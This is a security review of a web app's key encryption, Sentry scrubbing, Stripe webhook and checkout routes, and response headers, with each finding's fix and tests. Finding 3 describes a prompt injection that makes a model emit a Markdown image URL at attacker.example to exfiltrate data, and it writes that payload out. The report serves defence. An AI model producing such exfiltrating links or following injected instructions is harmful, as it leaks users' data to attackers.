# Security review: key handling, logging and the Stripe webhook (M6)

Date: 2026-11-18. Scope: browser API key encryption (Free mode), the server OpenRouter key (Pro mode), logging and Sentry, the Stripe checkout and webhook routes, and the new share and sync routes. Method: reading the code and the installed Sentry SDK, then tests for every fix. Nothing here called a cloud service.

## Summary

| # | Finding | Severity | Status |
|---|---|---|---|
| 1 | Browser key encryption used a key derived from public browser properties | Medium | Fixed |
| 2 | Server Sentry events could carry ID tokens, App Check tokens and prompts | Medium | Fixed |
| 3 | Model answers could load remote images (a data exfiltration channel) | Low | Fixed |
| 4 | Checkout return links fell back to the request's Host header | Low | Fixed |
| 5 | No body size limit on the webhook and checkout routes | Low | Fixed |
| 6 | `provider.listTextModels` used server keys for any signed-in user | Low | Fixed |
| 7 | No security headers | Low | Partly fixed; a full CSP is a follow-up |

## Findings and fixes

### 1. Browser key encryption (medium, fixed)

`shared-utils/src/security/encryption.ts` encrypted provider keys with AES-256-GCM, but the key was `SHA-256(userAgent | language | platform | cores | screen | timezone)`, imported as extractable. Nothing secret went into it. Anyone with a copy of the `ensemble-ai-store` localStorage value (a disk image, a synced profile, a malicious extension that only reads storage) could recompute the key and decrypt every stored provider key. A browser update that changed the user agent also made stored keys unreadable, and they were then wiped.

Fix: a random AES-256-GCM key is generated once per browser profile with `extractable: false` and stored as a `CryptoKey` in IndexedDB (`ensemble-ai-keys`). Page script can use it but cannot read its bytes, so a copy of localStorage alone is useless. New ciphertexts start with `v2:`. Old ciphertexts still decrypt with the derived key, and the API key and endpoint slices encrypt them again with the device key on load. Where IndexedDB is missing the old derived key is still used.

Limits: script running on the page (XSS) can still ask the browser to decrypt. This protects keys at rest, not against XSS.

Tests: `shared-utils/src/security/__tests__/encryption.test.ts` (the key is not extractable, survives a reload, a different profile cannot decrypt, legacy ciphertexts still read), `app/src/store/__tests__/apiKeySlice.test.ts` (legacy keys are encrypted again).

### 2. Sentry events (medium, fixed)

The tRPC route reports handled errors to Sentry by default (UNAUTHORIZED, TOO_MANY_REQUESTS and so on). The installed `@sentry/core` 10.39 attaches request headers and bodies to server events by default and only strips cookies and IP headers. Events could therefore carry the Firebase ID token (`authorization`), the App Check token, the `stripe-signature` header and request bodies, which hold prompts.

Fix: `app/src/lib/sentryScrub.ts` removes `authorization`, `cookie`, `x-firebase-appcheck`, `stripe-signature` and `proxy-authorization` headers, request bodies, cookies and query strings, and strips query strings from breadcrumb URLs. It is the `beforeSend` of the client, server and edge configs, which also set `sendDefaultPii: false`. Session Replay now states `maskAllText`, `maskAllInputs` and `blockAllMedia` explicitly (they were the SDK defaults), so a default change cannot expose typed keys.

Test: `app/src/lib/__tests__/sentryScrub.test.ts`.

### 3. Images in model output (low, fixed)

The Markdown atom rendered images. A prompt injection could make a model answer with `![](https://attacker.example/?d=...)`, and the browser would request that URL as soon as the answer rendered, sending whatever the model put in it. Fix: images render as their alt text and are never loaded. Test: `component-library/src/components/atoms/Markdown/Markdown.test.tsx`.

### 4. Checkout return links (low, fixed)

Without `APP_URL`, `success_url` and `cancel_url` came from the request URL, which follows the Host header. A browser cannot forge Host for a victim, so the impact was small. Fix: in production, `/api/stripe/checkout` answers 503 until `APP_URL` is set. Test: `app/src/server/stripe/__tests__/checkout.test.ts`.

### 5. Body size limits (low, fixed)

`/api/stripe/webhook` and `/api/stripe/checkout` read the whole body before any check. Fix: `app/src/server/http/bodyLimit.ts` refuses a body over the limit from its `Content-Length`, and again after reading: 256 KiB for the webhook (before the signature check), 4 KiB for checkout. Both answer 413. Tests: `bodyLimit.test.ts`, `checkout.test.ts`.

### 6. `provider.listTextModels` (low, fixed)

It listed models with the direct server provider keys for any signed-in user, with no App Check. Listing models is free, so only quota was exposed. It is now a `proProcedure` like the billed calls.

### 7. Security headers (low, partly fixed)

The app sent no security headers. `next.config.mjs` now sets `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, a `Permissions-Policy` that turns off camera, microphone, geolocation and payment, and a `Content-Security-Policy` with `frame-ancestors 'none'; base-uri 'self'; object-src 'none'`, and drops `X-Powered-By`.

Not done: a CSP with `script-src` and `connect-src` allowlists. Free mode calls six provider APIs and any user-configured endpoint from the browser, and the theme script is inline, so a strict policy needs a nonce and a way to allow user endpoints. It is the main remaining defence-in-depth gap against XSS stealing decrypted keys from memory.

## Checked and fine

- No plaintext key is persisted: `sanitizeStateForPersist` and `sanitizeEndpointsForPersist` blank keys before the store is written to localStorage. Run history records hold no key fields. Clear data wipes the store and history.
- Each encryption uses a fresh random 12-byte IV.
- Provider error messages pass through `sanitizeProviderErrorMessage`, which redacts `sk-`, `sk-ant-`, `sk-or-`, `AIza`, `xai-`, `pplx-`, Bearer tokens and `?key=` before they are shown or logged. Log calls in the key slices name the provider, never the key.
- Google keys go in the `x-goog-api-key` header, not the URL.
- `OPENROUTER_API_KEY` is a server variable (no `NEXT_PUBLIC_` prefix), read only in `server/pro/config.ts` and `upstream.ts`. Pro errors reach the client as sanitized provider messages or a generic message; no headers are echoed. The SSE stream sends the ID token and App Check token as headers, not in the URL.
- Stripe webhook: the signature is verified over the raw body with `constructEvent`. The amount credited comes from the server's pack config, checked against `amount_total` and `currency`; client metadata is not trusted for the amount. `uid` comes from `client_reference_id`, which only the server sets. Purchases are idempotent on the Checkout Session id and event id inside a Firestore transaction; reversals are capped at the purchase. Error bodies are generic. `event.livemode` is not checked, which only matters if test and live mode shared a signing secret, and Stripe gives them different ones.
- Checkout needs a verified Firebase ID token (revocation checked) sent as a Bearer header, so there is no cookie-based CSRF. The pack id is validated with zod and against the config.
- Shares and sync (new in M6): server writes only, closed to clients in `firestore.rules` (tested). Share ids are 128 random bits. A shared run passes a strict schema, so unknown fields such as keys are refused rather than stored; synced items with a secret-looking field name are refused by the server and stripped by the client. Share creation and sync writes are rate limited per user. Only the owner can delete a share.
